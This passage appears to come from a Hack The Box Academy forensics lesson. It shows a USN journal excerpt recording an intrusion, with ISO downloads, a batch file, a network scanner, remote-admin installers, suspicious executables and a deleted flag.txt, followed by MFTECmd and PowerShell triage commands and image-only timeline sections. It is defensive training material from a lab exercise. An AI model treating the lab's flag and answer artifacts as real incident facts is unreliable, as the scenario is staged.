2023-08-10 09:11:27.157166 0.2.filtertrie.intermediate.txt       ARCHIVE                     FILE_CREATE
2023-08-10 09:11:27.157166 0.2.filtertrie.intermediate.txt       ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:11:27.157166 0.2.filtertrie.intermediate.txt       ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:11:46.605635 Google Chrome.lnk                     ARCHIVE                     DATA_TRUNCATION
2023-08-10 09:11:46.622581 Google Chrome.lnk                     ARCHIVE                     DATA_EXTEND DATA_TRUNCA...
2023-08-10 09:11:46.622581 Google Chrome.lnk                     ARCHIVE                     DATA_EXTEND DATA_TRUNCA...
2023-08-10 09:13:20.519865 LICENSE.txt                           ARCHIVE                     FILE_CREATE
2023-08-10 09:13:20.519865 LICENSE.txt                           ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:13:20.521053 LICENSE.txt                           ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:13:20.521053 LICENSE.txt                           ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:14:40.958673 Finance08062023.iso                   ARCHIVE                     RENAME_NEW_NAME
2023-08-10 09:14:40.958673 Finance08062023.iso                   ARCHIVE                     RENAME_NEW_NAME CLOSE
2023-08-10 09:14:41.061007 Finance08062023.iso                   ARCHIVE                     STREAM_CHANGE
2023-08-10 09:14:41.062572 Finance08062023.iso                   ARCHIVE                     NAMED_DATA_EXTEND STREA...
2023-08-10 09:14:41.063389 Finance08062023.iso                   ARCHIVE                     NAMED_DATA_EXTEND STREA...
2023-08-10 09:14:41.065336 Finance08062023.iso                   ARCHIVE                     NAMED_DATA_EXTEND
2023-08-10 09:14:41.066383 Finance08062023.iso                   ARCHIVE                     NAMED_DATA_EXTEND CLOSE
2023-08-10 09:14:48.337845 Finance08062023 (1).iso               ARCHIVE                     RENAME_NEW_NAME
2023-08-10 09:14:48.337845 Finance08062023 (1).iso               ARCHIVE                     RENAME_NEW_NAME CLOSE
2023-08-10 09:14:48.440773 Finance08062023 (1).iso               ARCHIVE                     STREAM_CHANGE
2023-08-10 09:14:48.443245 Finance08062023 (1).iso               ARCHIVE                     NAMED_DATA_EXTEND STREA...
2023-08-10 09:14:48.443823 Finance08062023 (1).iso               ARCHIVE                     NAMED_DATA_EXTEND STREA...
2023-08-10 09:14:48.445082 Finance08062023 (1).iso               ARCHIVE                     NAMED_DATA_EXTEND
2023-08-10 09:14:48.445778 Finance08062023 (1).iso               ARCHIVE                     NAMED_DATA_EXTEND CLOSE
2023-08-10 09:15:18.551046 Finance08062023 (2).iso               ARCHIVE                     RENAME_NEW_NAME
2023-08-10 09:15:18.551046 Finance08062023 (2).iso               ARCHIVE                     RENAME_NEW_NAME CLOSE
2023-08-10 09:15:18.647015 Finance08062023 (2).iso               ARCHIVE                     STREAM_CHANGE
2023-08-10 09:15:18.649055 Finance08062023 (2).iso               ARCHIVE                     NAMED_DATA_EXTEND STREA...
2023-08-10 09:15:18.649055 Finance08062023 (2).iso               ARCHIVE                     NAMED_DATA_EXTEND STREA...
2023-08-10 09:15:18.651152 Finance08062023 (2).iso               ARCHIVE                     NAMED_DATA_EXTEND
2023-08-10 09:15:18.651152 Finance08062023 (2).iso               ARCHIVE                     NAMED_DATA_EXTEND CLOSE
2023-08-10 09:15:24.065351 chrome_shutdown_ms.txt                ARCHIVE                     FILE_CREATE
2023-08-10 09:15:24.065351 chrome_shutdown_ms.txt                ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:15:24.065351 chrome_shutdown_ms.txt                ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:16:32.942745 temp.bat                              ARCHIVE                     FILE_CREATE
2023-08-10 09:16:32.942745 temp.bat                              ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:16:32.942745 temp.bat                              ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:20:26.465120 advanced_ip_scanner.exe               ARCHIVE                     FILE_CREATE
2023-08-10 09:20:26.465120 advanced_ip_scanner.exe               ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:20:26.465120 advanced_ip_scanner.exe               ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:20:26.480509 advanced_ip_scanner.exe               ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:20:26.480509 advanced_ip_scanner_console.exe       ARCHIVE                     FILE_CREATE
2023-08-10 09:20:26.480509 advanced_ip_scanner_console.exe       ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:20:26.496403 advanced_ip_scanner_console.exe       ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:20:26.496403 advanced_ip_scanner_console.exe       ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:20:26.997883 mac_interval_tree.txt                 ARCHIVE                     FILE_CREATE
2023-08-10 09:20:26.997883 mac_interval_tree.txt                 ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:20:27.014402 mac_interval_tree.txt                 ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:20:27.014402 mac_interval_tree.txt                 ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:20:27.232407 rserv35ml.msi                         ARCHIVE                     FILE_CREATE
2023-08-10 09:20:27.232407 rserv35ml.msi                         ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:20:27.248411 rserv35ml.msi                         ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:20:27.248411 rserv35ml.msi                         ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:20:27.248411 rview35ml.msi                         ARCHIVE                     FILE_CREATE
2023-08-10 09:20:27.248411 rview35ml.msi                         ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:20:27.263685 rview35ml.msi                         ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:20:27.263685 rview35ml.msi                         ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:21:14.992912 mscorsvw.exe                          ARCHIVE                     CLOSE
2023-08-10 09:21:17.571321 __PSScriptPolicyTest_52uctvwi.opa.ps1 ARCHIVE                     FILE_CREATE
2023-08-10 09:21:17.571321 __PSScriptPolicyTest_52uctvwi.opa.ps1 ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:21:17.571321 __PSScriptPolicyTest_52uctvwi.opa.ps1 ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:21:17.602633 __PSScriptPolicyTest_52uctvwi.opa.ps1 ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:22:32.547132 svchost.exe                           ARCHIVE                     FILE_CREATE
2023-08-10 09:22:32.547132 svchost.exe                           ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:22:32.547132 svchost.exe                           ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:23:14.687719 8ea5559.exe                           ARCHIVE                     FILE_CREATE
2023-08-10 09:23:14.687719 8ea5559.exe                           ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:23:14.687719 8ea5559.exe                           ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:23:16.769239 8ea5559.exe                           ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:23:49.593517 __PSScriptPolicyTest_ptwgv3tl.xml.ps1 ARCHIVE                     FILE_CREATE
2023-08-10 09:23:49.593517 __PSScriptPolicyTest_ptwgv3tl.xml.ps1 ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:23:49.593517 __PSScriptPolicyTest_ptwgv3tl.xml.ps1 ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:23:49.609039 __PSScriptPolicyTest_ptwgv3tl.xml.ps1 ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:24:23.589821 flag.txt                              ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:25:48.088921 svchost.exe                           ARCHIVE NOT_CONTENT_INDEXED FILE_CREATE
2023-08-10 09:25:48.092299 svchost.exe                           ARCHIVE NOT_CONTENT_INDEXED DATA_EXTEND FILE_CREATE
2023-08-10 09:25:48.092903 svchost.exe                           ARCHIVE NOT_CONTENT_INDEXED DATA_EXTEND FILE_CREATE...
2023-08-10 09:26:44.813913 __PSScriptPolicyTest_1xpf1qga.ibp.ps1 ARCHIVE                     FILE_CREATE
2023-08-10 09:26:44.813913 __PSScriptPolicyTest_1xpf1qga.ibp.ps1 ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:26:44.813913 __PSScriptPolicyTest_1xpf1qga.ibp.ps1 ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:26:44.845295 __PSScriptPolicyTest_1xpf1qga.ibp.ps1 ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:26:46.019251 svchost.exe                           ARCHIVE NOT_CONTENT_INDEXED BASIC_INFO_CHANGE
2023-08-10 09:26:46.019251 svchost.exe                           ARCHIVE NOT_CONTENT_INDEXED BASIC_INFO_CHANGE CLOSE
2023-08-10 09:28:13.944143 photo443.exe                          ARCHIVE                     FILE_CREATE
2023-08-10 09:28:13.958954 photo443.exe                          ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:28:13.958954 photo443.exe                          ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:32:36.981215 chrome_shutdown_ms.txt                ARCHIVE                     FILE_DELETE CLOSE
2023-08-10 09:32:50.968515 VERSION.txt                           ARCHIVE                     FILE_CREATE
2023-08-10 09:32:50.968515 VERSION.txt                           ARCHIVE                     DATA_EXTEND FILE_CREATE
2023-08-10 09:32:50.968515 VERSION.txt                           ARCHIVE                     DATA_EXTEND FILE_CREATE...
2023-08-10 09:32:50.968515 VERSION.txt                           ARCHIVE                     DATA_EXTEND FILE_CREATE...
```

![https://academy.hackthebox.com/storage/modules/237/note1.png](https://academy.hackthebox.com/storage/modules/237/note1.png)

![https://academy.hackthebox.com/storage/modules/237/note2.png](https://academy.hackthebox.com/storage/modules/237/note2.png)

#### Analyzing Rapid Triage Data - MFT/pagefile.sys (MFTECmd/Autopsy)

``` cmd-session
C:\Users\johndoe>C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6\MFTECmd.exe -f C:\Users\johndoe\Desktop\files\mft_data --csv C:\Users\johndoe\Desktop\ --csvf mft_csv.csv
MFTECmd version 1.2.2.1

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/MFTECmd

Command line: -f C:\Users\johndoe\Desktop\files\mft_data --csv C:\Users\johndoe\Desktop\ --csvf mft_csv.csv

Warning: Administrator privileges not found!

File type: Mft

Processed C:\Users\johndoe\Desktop\files\mft_data in 4.9248 seconds

C:\Users\johndoe\Desktop\files\mft_data: FILE records found: 113,899 (Free records: 4,009) File size: 115.2MB
        CSV output will be saved to C:\Users\johndoe\Desktop\mft_csv.csv
```

``` powershell-session
PS C:\Users\johndoe> Select-String -Path  C:\Users\johndoe\Desktop\mft_csv.csv -Pattern "flag.txt"

Desktop\mft_csv.csv:143975:112346,4,False,104442,6,.\Users\johndoe\Desktop\reports,flag.txt,.txt,63,1,,False,False,Fals
e,True,False,False,Archive,DosWindows,2023-08-08 08:21:40.3050567,2023-08-08 08:23:43.3664676,2023-08-08
08:22:58.2111378,2023-08-08 08:23:43.3664676,2023-08-08 08:23:44.0401723,2023-08-08 08:23:43.3664676,2023-08-08
08:23:51.1904111,2023-08-08 08:23:43.3664676,31120880,232569553,2300,,,
```

![https://academy.hackthebox.com/storage/modules/237/image31.png](https://academy.hackthebox.com/storage/modules/237/image31.png)

![https://academy.hackthebox.com/storage/modules/237/image83.png](https://academy.hackthebox.com/storage/modules/237/image83.png)

![https://academy.hackthebox.com/storage/modules/237/image6__.png](https://academy.hackthebox.com/storage/modules/237/image6__.png)

## Constructing an Execution Timeline

![https://academy.hackthebox.com/storage/modules/237/timeline.png](https://academy.hackthebox.com/storage/modules/237/timeline.png)

![https://academy.hackthebox.com/storage/modules/237/image66.png](https://academy.hackthebox.com/storage/modules/237/image66.png)

![https://academy.hackthebox.com/storage/modules/237/image89.png](https://academy.hackthebox.com/storage/modules/237/image89.png)

## The Actual Attack Timeline

![https://academy.hackthebox.com/storage/modules/237/att1.png](https://academy.hackthebox.com/storage/modules/237/att1.png)

![https://academy.hackthebox.com/storage/modules/237/att2.png](https://academy.hackthebox.com/storage/modules/237/att2.png)

# 

# 

#### Questions

####